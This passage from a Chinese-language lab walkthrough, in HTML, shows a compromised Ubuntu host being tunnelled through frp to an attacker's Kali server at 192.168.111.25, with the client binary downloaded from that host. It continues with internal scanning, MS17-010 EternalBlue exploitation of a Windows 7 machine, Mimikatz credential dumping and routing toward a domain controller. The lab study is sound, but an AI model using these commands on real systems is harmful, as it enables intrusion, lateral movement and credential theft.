netmask 255.255.255.0  broadcast 192.168.111.255</span><br><span class="line">        inet6 fe80::250:56ff:feb1:58d9  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:50:56:b1:58:d9  txqueuelen 1000  (以太网)</span><br><span class="line">        RX packets 40539  bytes 7760872 (7.7 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 38795  bytes 7178320 (7.1 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens38: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.1.6  netmask 255.255.255.0  broadcast 10.0.1.255</span><br><span class="line">        inet6 fe80::250:56ff:feb1:6f79  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:50:56:b1:6f:79  txqueuelen 1000  (以太网)</span><br><span class="line">        RX packets 2055  bytes 134439 (134.4 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 4859  bytes 359575 (359.5 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (本地环回)</span><br><span class="line">        RX packets 9235  bytes 735118 (735.1 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 9235  bytes 735118 (735.1 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">veth20c344f: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet6 fe80::601d:19ff:fe25:f22e  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 62:1d:19:25:f2:2e  txqueuelen 0  (以太网)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 114  bytes 12320 (12.3 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">veth7d01ad0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet6 fe80::44e6:43ff:fe29:6b43  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 46:e6:43:29:6b:43  txqueuelen 0  (以太网)</span><br><span class="line">        RX packets 38608  bytes 7127648 (7.1 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 40405  bytes 7629131 (7.6 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">saul@ubantu:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>靶场暴露主网卡：<code>ens33</code> → <code>192.168.111.20</code></li>
+<li>内网横向网段：<code>ens38</code> → <code>10.0.1.6</code></li>
+<li>Docker 网关：<code>docker0</code> → <code>172.17.0.1</code></li>
+</ul>
+<p>写一下for 循环ping一下内网的C断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done</span><br></pre></td></tr></table></figure>
+<p>这步也可以留着后面做，我们先做frp流量转发</p>
+<p>利用已经拿到权限的 Ubuntu 主机作为 frp 客户端，你的 Kali 作为 frp 服务端，通过 frp 建立一条 <strong>socks5 代理隧道</strong>，把 Ubuntu 所在的内网（<code>10.0.1.0/24</code> 网段）流量转发到 Kali。之后你在 Kali 上配合 proxychains 就能直接扫描、访问内网所有主机，完成横向渗透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.58.1/frp_0.58.1_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.58.1_linux_amd64.tar.gz</span><br><span class="line">cd frp_0.58.1_linux_amd64</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>frps</code>：服务端程序，放在 Kali 上运行</li>
+<li><code>frpc</code>：客户端程序，要传到靶机 Ubuntu 上运行</li>
+</ul>
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/frp_0.58.1_linux_amd64</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后新开一个终端，进入frp目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/frp_0.58.1_linux_amd64</span><br><span class="line">然后</span><br><span class="line">cat &gt; frps.toml &lt;&lt; EOF</span><br><span class="line">bindPort = 7000</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p>最后启动frp服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.toml &amp;</span><br><span class="line">或者</span><br><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure>
+<p>检查服务是否运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep frps</span><br><span class="line">ps aux | grep &quot;http.server&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后回到SSH机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; frpc.toml &lt;&lt; EOF</span><br><span class="line">serverAddr = &quot;192.168.111.25&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;socks5_proxy&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 1080</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">saul@ubantu:~$ cat &gt; frpc.toml &lt;&lt; EOF</span><br><span class="line">&gt; serverAddr = &quot;192.168.111.25&quot;</span><br><span class="line">&gt; serverPort = 7000</span><br><span class="line">&gt; </span><br><span class="line">&gt; [[proxies]]</span><br><span class="line">&gt; name = &quot;socks5_proxy&quot;</span><br><span class="line">&gt; type = &quot;tcp&quot;</span><br><span class="line">&gt; remotePort = 1080</span><br><span class="line">&gt; [proxies.plugin]</span><br><span class="line">&gt; type = &quot;socks5&quot;</span><br><span class="line">&gt; EOF</span><br><span class="line">saul@ubantu:~$ cat frpc.toml</span><br><span class="line">serverAddr = &quot;192.168.111.25&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;socks5_proxy&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 1080</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">saul@ubantu:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后下载frpc客户端二进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">saul@ubantu:~$ wget http://192.168.111.25/frpc</span><br><span class="line">--2026-10-16 04:21:03--  http://192.168.111.25/frpc</span><br><span class="line">正在连接 192.168.111.25:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度： 14471320 (14M) [application/octet-stream]</span><br><span class="line">正在保存至: “frpc”</span><br><span class="line"></span><br><span class="line">frpc                   100%[===========================&gt;]  13.80M  3.19MB/s    用时 3.9s  </span><br><span class="line"></span><br><span class="line">2026-10-16 04:21:07 (3.54 MB/s) - 已保存 “frpc” [14471320/14471320])</span><br><span class="line"></span><br><span class="line">saul@ubantu:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下好了，给权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br></pre></td></tr></table></figure>
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<p>这个时候SSH机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">saul@ubantu:~$ ./frpc -c frpc.toml</span><br><span class="line">2026-10-16 04:22:21.591 [I] [sub/root.go:142] start frpc service for config file [frpc.toml]                                                                                          </span><br><span class="line">2026-10-16 04:22:21.591 [I] [client/service.go:294] try to connect to server...            </span><br><span class="line">2026-10-16 04:22:21.765 [I] [client/service.go:286] [f51270a39a66c3b7] login to server success, get run id [f51270a39a66c3b7]                                                         </span><br><span class="line">2026-10-16 04:22:21.765 [I] [proxy/proxy_manager.go:173] [f51270a39a66c3b7] proxy added: [socks5_proxy]                                                                               </span><br><span class="line">2026-10-16 04:22:21.830 [I] [client/control.go:168] [f51270a39a66c3b7] [socks5_proxy] start proxy success                                                                             </span><br></pre></td></tr></table></figure>
+<p>我们的kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/frp_0.58.1_linux_amd64]</span><br><span class="line">└─#./frps -c frps.toml</span><br><span class="line"></span><br><span class="line">2026-10-15 20:39:31.985 [I] [frps/root.go:105] frps uses config file: frps.toml</span><br><span class="line">2026-10-15 20:39:32.055 [I] [server/service.go:237] frps tcp listen on 0.0.0.0:7000</span><br><span class="line">2026-10-15 20:39:32.055 [I] [frps/root.go:114] frps started successfully</span><br><span class="line">2026-10-15 20:43:26.152 [I] [server/service.go:576] [f51270a39a66c3b7] client login info: ip [192.168.111.20:41684] version [0.58.1] hostname [] os [linux] arch [amd64]</span><br><span class="line">2026-10-15 20:43:26.218 [I] [proxy/tcp.go:82] [f51270a39a66c3b7] [socks5_proxy] tcp proxy listen port [1080]</span><br><span class="line">2026-10-15 20:43:26.218 [I] [server/control.go:399] [f51270a39a66c3b7] new proxy [socks5_proxy] type [tcp] success</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到成功了<br>然后打开MSF</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">先上再下</span><br><span class="line">setg PROXIES socks5:127.0.0.1:1080</span><br></pre></td></tr></table></figure>
+<p>让所有 msf 的 exploit&#x2F;aux 模块流量走 <code>127.0.0.1:1080</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; getg PROXIES</span><br><span class="line">PROXIES =&gt; </span><br><span class="line">msf &gt; setg PROXIES socks5:127.0.0.1:1080</span><br><span class="line">PROXIES =&gt; socks5:127.0.0.1:1080</span><br><span class="line">msf &gt; getg PROXIES</span><br><span class="line">PROXIES =&gt; socks5:127.0.0.1:1080</span><br><span class="line">msf &gt; </span><br></pre></td></tr></table></figure>
+<p>然后扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set RHOSTS 10.0.1.6</span><br><span class="line">set PORTS 22</span><br><span class="line">set THREADS 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 10.0.1.6</span><br><span class="line">RHOSTS =&gt; 10.0.1.6</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; set PORTS 22</span><br><span class="line">PORTS =&gt; 22</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; set THREADS 1</span><br><span class="line">THREADS =&gt; 1</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line">[+] 10.0.1.6:22           - 10.0.1.6:22 - TCP OPEN</span><br><span class="line">[*] 10.0.1.6:22           - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到成功了</p>
+<p>我们接下来查找网段内所有IP的其他主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/tcp_ping</span><br><span class="line">set RHOSTS 10.0.1.0/24</span><br><span class="line">set PORTS 22,80</span><br><span class="line">set THREADS 2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>也可以再增加常用的一些端口</p>
+<p>比如22,80,443,3389,8080,8081,9090等等端口都是可以的</p>
+<p>还有就是我们前面提到的，有这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done</span><br></pre></td></tr></table></figure>
+<p>在SSH里面执行这个就可以了的</p>
+<p><code>10.0.1.6</code>（当前跳板 Ubuntu 本身）<br><code>10.0.1.7</code>（新的目标机器，横向目标！）</p>
+<p>然后看另外一台机器开了什么端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set RHOSTS 10.0.1.7</span><br><span class="line">set PORTS 1-1000</span><br><span class="line">set THREADS 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line">[+] 10.0.1.7:22           - 10.0.1.7:139 - TCP OPEN</span><br><span class="line">[+] 10.0.1.7:22           - 10.0.1.7:135 - TCP OPEN</span><br><span class="line">[+] 10.0.1.7:22           - 10.0.1.7:445 - TCP OPEN</span><br><span class="line">[*] 10.0.1.7:22           - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+<p>135&#x2F;139&#x2F;445 是典型 Windows 机器的 SMB 相关端口！<br>这是一台 Windows 主机，大概率存在 SMB 漏洞</p>
+<p>打MS17-010</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 10.0.1.7</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>这里不行，因为我们之前指定了其他端口<br>我们现在要换成其他端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set RHOSTS 10.0.1.7</span><br><span class="line">set RPORT 445</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; set RPORT 445</span><br><span class="line">RPORT =&gt; 445</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line">[+] 10.0.1.7:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line"></span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator &#x27;+&#x27; and &#x27;?&#x27; was replaced with &#x27;*&#x27; in regular expression</span><br><span class="line">[*] 10.0.1.7:445          - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; </span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; </span><br></pre></td></tr></table></figure>
+<p>可以看到返回了大概率存在MS17-010<br>靶场Windows7，payload选x64的meterpreter<br>这里LHOST要填跳板机的IP：192.168.111.20（因为内网10.0.1.7只能访问同网段<br>10.0.1.6，不能直接回连你Kali）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 10.0.1.7</span><br><span class="line">set RPORT 445</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.0.1.6</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>报错了</p>
+<p>MSF 全局开启了 socks 代理，<strong>reverse_tcp 反弹 payload 默认不允许配合全局代理使用</strong>，MSF 担心流量环路。<br>提示给了解决开关：<code>ReverseAllowProxy true</code>。或者直接改用<strong>bind_tcp 正向 payload（推荐，更稳）</strong></p>
+<p>我这边选择这个正向连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 10.0.1.7</span><br><span class="line">set RPORT 445</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/bind_tcp</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>回显：6 +0800<br>[+] 10.0.1.7:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;<br>[+] 10.0.1.7:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-WIN-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;<br>[+] 10.0.1.7:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</p>
+<p>meterpreter &gt;<br>读音<br>米特 - 普瑞特</p>
+<p>还有这个metasploit，麦特 - 斯普洛伊特</p>
+<p>然后sysinfo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : REDTEAM</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>拿到 Win7 权限后加载 Mimikatz 抓取明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<p>此时我们得到了一个域用户的账号密码root:Red12345</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1736 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;set logonserver</span><br><span class="line">set logonserver</span><br><span class="line">�������� logonserver û�ж���</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>
+<p>拿到主机名<br>然后再去解析拿到IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;set logonserver</span><br><span class="line">set logonserver</span><br><span class="line">�������� logonserver û�ж���</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;nslookup REDTEAM.LAB</span><br><span class="line">nslookup REDTEAM.LAB</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">������:  UnKnown</span><br><span class="line">Address:  10.0.0.12</span><br><span class="line"></span><br><span class="line">����:    REDTEAM.LAB</span><br><span class="line">Address:  10.0.0.12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>
+<p>我们先退出shell<br>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
+<p>再回到MSF主控制台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information               Connection</span><br><span class="line">  --  ----  ----                     -----------               ----------</span><br><span class="line">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WI  127.0.0.1:39451 -&gt; 127.0.</span><br><span class="line">                                     N7                        0.1:1080 (10.0.1.7)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 10.0.0.0 255.255.255.0 1</span><br></pre></td></tr></table></figure>
+<p>然后route查看路由，看到一条 <code>10.0.0.0/255.255.255.0</code> 路由，网关指向 session 1<br>路由添加成功之后，就可以使用 msf 内置 wmiexec 模块尝试连接域控 10.0.0.12<br>然后换模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; use exploit/windows/smb/psexec</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; </span><br></pre></td></tr></table></figure>
+<p>然后<br>但是啊，我发现这个方法打不通这个，拿不下这个域控</p>
+<p>msf exploit(windows&#x2F;smb&#x2F;psexec) &gt; back<br>msf &gt;<br>先back回到这个主控制台</p>
+<p>然后先开代理</p>
